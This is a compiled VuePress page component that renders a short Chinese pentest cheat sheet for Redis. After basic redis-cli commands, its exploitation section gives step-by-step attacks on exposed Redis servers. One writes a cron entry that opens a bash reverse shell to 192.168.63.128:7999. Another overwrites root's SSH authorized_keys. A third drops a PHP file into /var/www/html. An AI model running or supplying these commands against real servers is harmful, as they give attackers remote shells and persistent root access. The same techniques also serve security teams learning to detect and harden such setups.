import{_ as a,p as s,q as n,Z as e}from"./framework-47a2e622.js";const t={},l=e(`<h2 id="命令" tabindex="-1"><a class="header-anchor" href="#命令" aria-hidden="true">#</a> 命令</h2><ul><li>连接</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>redis-cli <span class="token parameter variable">-h</span> <span class="token number">127.0</span>.0.1
</code></pre></div><ul><li>查看信息</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token operator">&gt;</span>info
</code></pre></div><ul><li>设置变量</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token builtin class-name">set</span> x <span class="token string">&quot;test&quot;</span> <span class="token comment"># 将变量 x 设置成 test。</span>
</code></pre></div><ul><li>删除数据库</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token operator">&gt;</span>flushall
</code></pre></div><ul><li>查看所有键</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>KEYS *
</code></pre></div><ul><li>获取默认目录</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>CONFIG GET <span class="token function">dir</span>
</code></pre></div><ul><li>获取 rdb 文件名</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>CONFIG GET dbfilename
</code></pre></div><h2 id="利用" tabindex="-1"><a class="header-anchor" href="#利用" aria-hidden="true">#</a> 利用</h2><ul><li>计划任务</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>redis-cli <span class="token parameter variable">-h</span> <span class="token number">127.0</span>.0.1
<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> x <span class="token string">&quot;<span class="token entity" title="\\n">\\n</span>* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1<span class="token entity" title="\\n">\\n</span>&quot;</span>
<span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/spool/cron/
<span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> dbfilename root
<span class="token operator">&gt;</span> save
</code></pre></div><ul><li>替换公钥</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>ssh-keygen <span class="token parameter variable">-t</span> rsa <span class="token comment"># 生成公钥。</span>
<span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /root/.ssh/
<span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> dbfilename authorized_keys
<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> x <span class="token string">&quot;<span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span>ssh-rsa {{rsa_key}}<span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span><span class="token entity" title="\\n">\\n</span>&quot;</span>
<span class="token operator">&gt;</span> save
</code></pre></div><ul><li>写入木马</li></ul><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> /var/www/html/
<span class="token operator">&gt;</span> config <span class="token builtin class-name">set</span> dbfilename shell.php
<span class="token operator">&gt;</span> <span class="token builtin class-name">set</span> x <span class="token string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>
<span class="token operator">&gt;</span> save
</code></pre></div>`,22),p=[l];function o(c,i){return s(),n("div",null,p)}const d=a(t,[["render",o],["__file","basicKnowledge.html.vue"]]);export{d as default};
